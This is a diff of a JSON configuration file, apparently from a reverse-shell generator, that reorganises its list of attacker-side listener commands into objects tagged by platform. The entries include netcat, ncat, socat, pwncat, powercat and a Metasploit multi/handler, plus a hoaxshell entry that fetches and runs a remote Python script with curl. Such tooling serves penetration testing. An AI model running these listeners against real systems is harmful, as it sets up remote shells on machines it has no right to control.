@@ -896,24 +896,26 @@
             ]
         }
     ],
-    "special": {
-        "listener": [
-            ["nc", "nc -lvnp {port}"],
-            ["nc freebsd", "nc -lvn {port}"],
-            ["busybox nc", "busybox nc -lp {port}"],
-            ["ncat", "ncat -lvnp {port}"],
-            ["ncat.exe", "ncat.exe -lvnp {port}"],
-            ["ncat (TLS)", "ncat --ssl -lvnp {port}"],
-            ["rlwrap + nc", "rlwrap -cAr nc -lvnp {port}"],
-            ["rustcat", "rcat listen {port}"],
-            ["pwncat", "python3 -m pwncat -lp {port}"],
-            ["windows ConPty", "stty raw -echo; (stty size; cat) | nc -lvnp {port}"],
-            ["socat", "socat -d -d TCP-LISTEN:{port} STDOUT"],
-            ["socat (TTY)", "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}"],
-            ["powercat", "powercat -l -p {port}"],
-            ["msfconsole", "msfconsole -q -x \"use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit\""],
-            ["hoaxshell", "python3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t {type} -p {port}"]
-        ],
-        "shells": ["sh", "/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh", "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash"]
-    }
+    "listeners": [ 
+            { "name":"nc", "command": "nc -lvnp {port}", "meta":[
+                "linux",
+                "mac",
+                "windows"
+            ]},
+            {"name":"nc freebsd", "command":"nc -lvn {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"busybox nc", "command":"busybox nc -lp {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"ncat", "command":"ncat -lvnp {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"ncat.exe", "command":"ncat.exe -lvnp {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"ncat (TLS)", "command":"ncat --ssl -lvnp {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"rlwrap + nc", "command":"rlwrap -cAr nc -lvnp {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"rustcat", "command":"rcat listen {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"pwncat", "command":"python3 -m pwncat -lp {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"windows ConPty", "command":"stty raw -echo; (stty size; cat) | nc -lvnp {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"socat", "command":"socat -d -d TCP-LISTEN:{port} STDOUT", "meta":["mac", "windows", "linux"]},
+            {"name":"socat (TTY)", "command":"socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}", "meta":["mac", "windows", "linux"]},
+            {"name":"powercat", "command":"powercat -l -p {port}", "meta":["mac", "windows", "linux"]},
+            {"name":"msfconsole", "command":"msfconsole -q -x \"use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit\"", "meta":["mac", "windows", "linux"]},
+            {"name":"hoaxshell", "command":"python3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t cmd-curl -p {port}", "meta":["mac", "windows", "linux"]}
+        
+    ]
 }
